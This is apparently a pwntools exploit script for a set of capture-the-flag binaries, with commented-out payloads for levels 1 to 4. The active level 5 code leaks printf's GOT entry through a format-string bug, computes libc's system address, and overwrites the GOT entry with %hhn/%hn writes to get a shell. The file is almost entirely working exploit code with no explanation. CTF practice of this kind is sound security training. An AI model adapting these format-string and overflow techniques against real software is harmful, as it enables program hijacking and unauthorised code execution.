from pwn import *

# Run process
context.arch = 'amd64'
context.terminal = ['tmux','new-window']
context.aslr = None

#r = remote('chal1.swampctf.com',1337)
#r = remote('127.0.0.1',5555)



#r = gdb.debug(['./power'],
#        """
#        b *0x0000555555554a99
#        """
#)



# Level1
#r = process(['./level1'])
#print(r.recvuntil("please:"))
#r.sendline(str(0x3da76))

# Level2
#r = process(['./level2'])
#print(r.recvuntil("party name?"))
#r.sendline('A'*124 + p32(0xcc07c9))

# Level3
#r = process(['./level3'])
#print(r.recvuntil("spell?"))
#r.sendline('\x2d'*200)


# Level 4
#r = process(['./level4'])
#print(r.recvuntil("action:"))
#r.sendline('73')
#r.sendline(p32(0x0804a47c)*100)

# Level 5
r = process(['./level5'])
#r = gdb.debug(['./level5'],
#        """
#        b overflow_small
#        b format_string 
#        c
#        """
#)

print(r.recvuntil("[3 format]:"))
printf = 0x00601230
stack_check = 0x0060121c
#r.sendline("%x"*20 + "AAA" + p64(printf) + "XXX")

leak = ''
for i in range(8):
    r.sendline('3')
    r.sendline("#####%12$s" + "A"*38 +  p64(printf+i))
    r.recvuntil("#####")
    l = r.recvuntil("A"*38)[:-38]
    if len(l) == 0:
        leak += '\x00'
    else:
        leak += l[0]

#libc = ELF("libx.so.6")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libc_system = libc.symbols["system"]
libc_printf = libc.symbols["printf"]

leak = unpack(leak)
base = leak - libc_printf
system = base + libc_system

log.info("Leak: " + hex(leak))
log.info("System: " + hex(system))

r.sendline('3')
byte1 = int(hex(system)[-2:],16)
log.info("Writing : "+hex(byte1)+" at "+hex(printf))
byte2 = int(hex(system)[-6:][:4],16)
log.info("Writing : "+hex(byte2)+" at "+hex(printf+1))

remaining = byte2 - byte1
ff = "%"+str(byte1)+"x%12$hhn%"+str(remaining)+"x%13$hn"
padding = 48 - len(ff)
log.info("Format string: "+ff)
log.info("Padding: "+str(padding))

r.sendline(ff + "A"*padding +  p64(printf) + p64(printf+1))

#r.sendline('1')
r.recvuntil("AAAA")

r.interactive()

"""
target = 0x4141414141414141
for i in range(8):
    r.sendline('3')
    byte = int(hex(target)[-2*(i+1):][:2],16)
    print(hex(byte))
    padding = 48 - len(str(byte)) - 7
    r.sendline("%"+str(byte)+"x%12$n" + "A"*padding +  p64(stack_check+i) )
"""

